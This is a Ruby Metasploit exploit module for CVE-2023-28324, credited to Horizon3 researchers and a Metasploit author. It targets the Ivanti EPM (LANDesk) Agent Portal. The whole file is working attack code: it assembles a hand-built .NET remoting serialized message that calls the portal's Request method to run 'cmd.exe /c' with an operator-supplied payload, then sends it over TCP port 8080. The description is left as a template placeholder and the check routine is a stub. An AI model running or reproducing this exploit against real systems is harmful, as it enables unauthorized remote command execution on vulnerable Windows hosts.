# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

require 'rex/proto/ms_nrtp/client'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Tcp

  Rank = ExcellentRanking
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ivanti EPM Agent Portal Command Execution',
      'Description'    => %q{
        Template description.
      },
      'Author'         => [
        'James Horseman', # original poc
        'Zach Hanley', # original poc
        'Spencer McIntyre' # metasploit module
      ],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2023-28324'],
        ['URL', 'https://github.com/horizon3ai/CVE-2023-28324'],
      ],
      'Platform'       => 'win',
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          [ 'Automatic',   {  } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2023-06-30', # NVD publish date
      'Notes'          =>
        {
          'Stability'   => [ CRASH_SAFE, ],
          'SideEffects' => [  ],
          'Reliability' => [ REPEATABLE_SESSION, ],
        }
    ))

    register_options([
      Opt::RPORT(8080)
    ])
  end

  def check
    CheckCode::Unknown
  end

  def exploit
    ss = Msf::Util::DotNetDeserialization::Types::SerializedStream.new({:records=>
      [{:record_type=>0, :record_value=>{:root_id=>1, :header_id=>-1, :major_version=>1, :minor_version=>0}},
       {:record_type=>21,
        :record_value=>
         {:message_enum=>
           {:method_signature_in_array=>1,
            :context_in_array=>0,
            :context_inline=>0,
            :no_context=>1,
            :args_in_array=>1,
            :args_is_array=>0,
            :args_inline=>0,
            :no_args=>0,
            :generic_method=>0,
            :unused1=>0,
            :exception_in_array=>0,
            :return_value_in_array=>0,
            :return_value_inline=>0,
            :return_value_void=>0,
            :no_return_value=>0,
            :properties_in_array=>0,
            :unused2=>0},
          :method_name=>"Request",
          :type_name=>"LANDesk.AgentPortal.IAgentPortal, AgentPortal, Version=11.0.0.0, Culture=neutral, PublicKeyToken=da26723fc8ab14fb"}},
       {:record_type=>16, :record_value=>{:array_info=>{:obj_id=>1, :member_count=>2}}},
       {:record_type=>9, :record_value=>{:id_ref=>2}},
       {:record_type=>9, :record_value=>{:id_ref=>3}},
       {:record_type=>16, :record_value=>{:array_info=>{:obj_id=>2, :member_count=>4}}},
       {:record_type=>6, :record_value=>{:obj_id=>4, :string=>"localhost"}},
       {:record_type=>9, :record_value=>{:id_ref=>5}},
       {:record_type=>6, :record_value=>{:obj_id=>6, :string=>'cmd.exe'}},
       {:record_type=>6, :record_value=>{:obj_id=>7, :string=>"/c #{payload.raw}"}},
       {:record_type=>7, :record_value=>{:obj_id=>3, :binary_array_type_enum=>0, :rank=>1, :lengths=>[4], :type_enum=>3, :additional_type_info=>"System.Type"}},
       {:record_type=>9, :record_value=>{:id_ref=>8}},
       {:record_type=>9, :record_value=>{:id_ref=>9}},
       {:record_type=>9, :record_value=>{:id_ref=>8}},
       {:record_type=>9, :record_value=>{:id_ref=>8}},
       {:record_type=>12, :record_value=>{:library_id=>11, :library_name=>"APCommon, Version=11.0.0.0, Culture=neutral, PublicKeyToken=da26723fc8ab14fb"}},
       {:record_type=>5,
        :record_value=>
         {:class_info=>{:obj_id=>5, :name=>"LANDesk.AgentPortal.IAgentPortalBase+ActionEnum", :member_count=>1, :member_names=>["value__"]},
          :member_type_info=>{:binary_type_enums=>[0], :additional_infos=>[8]},
          :library_id=>11,
          :member_values=>[1]}},
       {:record_type=>4,
        :record_value=>
         {:class_info=>{:obj_id=>8, :name=>"System.UnitySerializationHolder", :member_count=>3, :member_names=>["Data", "UnityType", "AssemblyName"]},
          :member_type_info=>{:binary_type_enums=>[1, 0, 1], :additional_infos=>[8]},
          :member_values=>
           [{:record_type=>6, :record_value=>{:obj_id=>12, :string=>"System.String"}}, 4, {:record_type=>6, :record_value=>{:obj_id=>13, :string=>"mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}]}},
       {:record_type=>1,
        :record_value=>
         {:obj_id=>9,
          :metadata_id=>8,
          :member_values=>
           [{:record_type=>6, :record_value=>{:obj_id=>14, :string=>"LANDesk.AgentPortal.IAgentPortalBase+ActionEnum"}},
            4,
            {:record_type=>6, :record_value=>{:obj_id=>15, :string=>"APCommon, Version=11.0.0.0, Culture=neutral, PublicKeyToken=da26723fc8ab14fb"}}]}},
       {:record_type=>11, :record_value=>{}}]}
    )

    client = Rex::Proto::MsNrtp::Client.new(
      datastore['RHOST'],
      datastore['RPORT'],
      'LANDeskAgentPortal/LDSM',
      context: { 'Msf' => framework, 'MsfExploit' => self }
    )
    # todo: deregister SSL options because this service doesn't use 'em

    client.connect

    client.send(ss.to_binary_s, 'application/octet-stream'.encode('UTF-8'))

  end
end
